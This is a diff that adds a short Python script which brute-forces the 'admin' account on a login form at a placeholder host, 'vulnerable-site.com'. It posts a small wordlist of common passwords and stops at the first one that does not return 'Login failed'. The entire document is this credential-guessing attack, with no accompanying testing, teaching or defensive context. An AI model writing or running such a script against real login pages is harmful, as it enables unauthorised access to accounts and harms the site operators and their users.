@@ -1,0 +1,8 @@
+import requests
+target_url = "http://vulnerable-site.com/login"
+wordlist = ["admin", "password", "123456"]
+for word in wordlist:
+    response = requests.post(target_url, data={"username": "admin", "password": word})
+    if "Login failed" not in response.text:
+        print(f"Password found: {word}")
+        break
